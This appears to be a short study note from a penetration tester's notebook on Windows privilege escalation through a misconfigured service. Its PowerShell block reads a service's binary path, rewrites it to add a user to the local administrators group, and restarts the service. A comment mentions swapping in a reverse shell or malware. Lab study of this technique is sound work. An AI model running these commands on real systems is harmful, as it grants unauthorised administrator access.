[[Dark Arts/Privesc/Windows/Enumeration/Binary Service Paths|Enum]]
Hijacking the path of a binary.
#### Change Service Config
```powershell
# as with the enum section, in our example case the vulnerable service is named:
# daclsvc
# this will put the current binary path of the service, under:
# BINARY_PATH_NAME
sc qc <service>
sc qc daclsvc

# From here we can change that path to a straight up cmd command, or, presumably, you can change the binary to a reverse shell or any malware we want. 
sc config <service> binpath= "<cmd or malware path>"
sc config daclsvc binpath= "net localgroup administrators killakxmi /add" 

# now restart the service, provided you have the access
# can throw an error, but if it does, the command may have still ran. 
sc start <service> 
sc start daclsvc
```
